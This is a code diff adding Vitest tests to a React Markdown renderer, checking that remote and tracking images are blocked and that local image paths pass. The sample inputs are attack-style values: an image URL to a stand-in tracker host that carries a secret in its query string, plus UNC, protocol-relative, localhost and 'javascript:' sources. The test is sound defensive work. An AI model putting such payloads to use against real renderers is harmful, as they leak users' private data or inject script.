@@ -1,6 +1,7 @@
 import { createElement } from "react";
 import { renderToStaticMarkup } from "react-dom/server";
 import { describe, expect, it } from "vitest";
+import { isLocalImageSource } from "../src/renderer/local-resources.js";
 import { MarkdownContent, workspaceFileIconKind, workspaceLinkPath } from "../src/renderer/markdown-content.js";
 
 describe("workspaceLinkPath", () => {
@@ -56,5 +57,27 @@ describe("workspace file link icons", () => {
     expect(html).toContain('class="workspace-file-link"');
     expect(html).toContain('data-file-kind="code"');
     expect(html.match(/workspace-file-link/g)).toHaveLength(1);
+  });
+});
+
+describe("local Markdown images", () => {
+  it("blocks tracking images while retaining local image paths", () => {
+    const html = renderToStaticMarkup(createElement(MarkdownContent, {
+      text: "![private project](https://tracker.example/pixel?prompt=secret) ![local](assets/cover.png)",
+    }));
+    expect(html).not.toContain("tracker.example");
+    expect(html).not.toContain("prompt=secret");
+    expect(html).toContain('src="assets/cover.png"');
+  });
+
+  it("rejects remote and ambiguous sources before a custom image renderer runs", () => {
+    for (const src of ["https://tracker.example/a.png", "//tracker.example/a.png", " http://127.0.0.1:9999/private ", "\\\\tracker.example\\image.png", "javascript:alert(1)", " "]) expect(isLocalImageSource(src)).toBe(false);
+    for (const src of ["assets/cover.png", "/assets/cover.png", "blob:local-image", "data:image/png;base64,AAAA"]) expect(isLocalImageSource(src)).toBe(true);
+    let rendered = false;
+    renderToStaticMarkup(createElement(MarkdownContent, {
+      text: "![remote](https://tracker.example/a.png)",
+      renderImage: () => { rendered = true; return null; },
+    }));
+    expect(rendered).toBe(false);
   });
 });
